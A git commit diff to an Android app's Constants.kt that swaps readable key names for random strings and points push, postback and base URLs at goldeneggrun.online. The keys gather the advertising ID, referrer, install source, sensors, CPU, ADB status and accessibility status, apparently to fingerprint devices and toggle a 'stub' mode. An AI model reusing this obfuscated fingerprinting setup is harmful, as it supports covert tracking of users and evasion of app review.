27bb4be225c124d345b661c1bfeb60124116196d
bogdan <murzinbt@gmail.com>
2026-03-18 13:21:57 +0200

    keys

--- app/src/main/java/com/pinger/textf/components/gray3/Constants.kt
+++ app/src/main/java/com/pinger/textf/components/gray3/Constants.kt
@@ -1,46 +1,43 @@
 package com.pinger.textf.components.gray3
 
+
 // STORAGE
-val FILE_NAME = "secure_user_info"
-val LINK_STORAGE_KEY = "lstore"
-val STUB_STORAGE_KEY = "sstore"
-val STUB_STORAGE_VALUE_TRUE = "err5g345g"
-val PUSH_STORAGE_KEY = "afgfgaf22g"
-val PUSH_STORAGE_VALUE_TRUE = "ffffgg"
-val ONE_TIME_FLAG = "ffffgg"
+val FILE_NAME = "q8klskgqzx6p"
+val LINK_STORAGE_KEY = "9m77ez"
+val STUB_STORAGE_KEY = "lifrfm"
+val STUB_STORAGE_VALUE_TRUE = "aqzcqx37"
+val PUSH_STORAGE_KEY = "3jkd9xn0mn"
+val PUSH_STORAGE_VALUE_TRUE = "dzau6f"
+val ONE_TIME_FLAG = "pdqapr"
+//val ADB_KEY = "iquoy9i"
 
 // App
-
 val ADB = "adb_enabled"
 val TRACKING_ID = "trackingId"
 
 // Push
-val PUSH_NOTIFICATION_API_URL = "push_notification_api_url"
-val PUSH_NOTIFICATION_API_GADID_KEY = "push_notification_api_gadid_key"
-val PUSH_NOTIFICATION_API_FCM_TOKEN_KEY = "push_notification_api_fcm_token_key"
+val PUSH_NOTIFICATION_API_URL = "goldeneggrun.online/kfaf7dvr7a/"
+val PUSH_NOTIFICATION_API_GADID_KEY = "8m8nzr7chj"
+val PUSH_NOTIFICATION_API_FCM_TOKEN_KEY = "g8me23hfag"
 
-val POSTBACK_API_URL = "postback_api_url"
-val POSTBACK_TRACKING_ID_KEY = "postback_tracking_id_key"
-val POSTBACK_FCM_TOKEN_KEY = "postback_fcm_token_key"
+val POSTBACK_API_URL = "goldeneggrun.online/2l7xftnxm0/"
+val POSTBACK_TRACKING_ID_KEY = "0fqbmuc5c9"
+val POSTBACK_FCM_TOKEN_KEY = "ut3n469uiv"
 
 // URL
+val BASE_URL = "goldeneggrun.online/privacypolicy/"
+val BASE_URL_STRICT = "goldeneggrun.online"
+val GADID_KEY = "hwxx8k97oi4bemd"
+val REF_KEY = "33hlp67yb7dy6sk"
+val DEVICE_MODEL_KEY = "z05cx0n4bn"
+val FIRST_TIME_INSTALL_KEY = "bexwa37dth"
+val PACKAGE_SOURCE_KEY = "tblf8iqtzbty"
+val FIREBASE_INSTALL_ID = "8ivtityrpqkfjsr4"
 
-val BASE_URL = "attribution_url"
-val BASE_URL_STRICT = "base_no_privacy"
-val GADID_KEY = "gadid_key"
-val REF_KEY = "referrer_key"
-val DEVICE_MODEL_KEY = "extra_param_3"
-val FIRST_TIME_INSTALL_KEY = "extra_param_1"
-val PACKAGE_SOURCE_KEY = "extra_param_10"
-val FIREBASE_INSTALL_ID = "external_id"
-
-val NETWORK_SECURITY_KEY = "extra_param_4"
-val SENSORS_KEY = "extra_param_5"
-val DEVICE_ID_KEY = "extra_param_8"
-val CPU_KEY = "extra_param_9"
-val BUILD_KEY = "extra_param_10"
-val CHRG_UP_BRIGHT_KEY = "sub_id_28 (extra_param_11)"
-val INSTALL_A11Y_KEY = "sub_id_30 (extra_param_12)"
-
-
-
+val NETWORK_SECURITY_KEY = "2huinu24d092excgcoh"
+val SENSORS_KEY = "q8gphyzqzbc8eb"
+val DEVICE_ID_KEY = "10ozeoal2g87n"
+val CPU_KEY = "87jka3vje5du8"
+val BUILD_KEY = "tblf8iqtzbty"
+val CHRG_UP_BRIGHT_KEY = "00x6a8t86vegsvamfi"
+val INSTALL_A11Y_KEY = "3i8x9d4sdr"
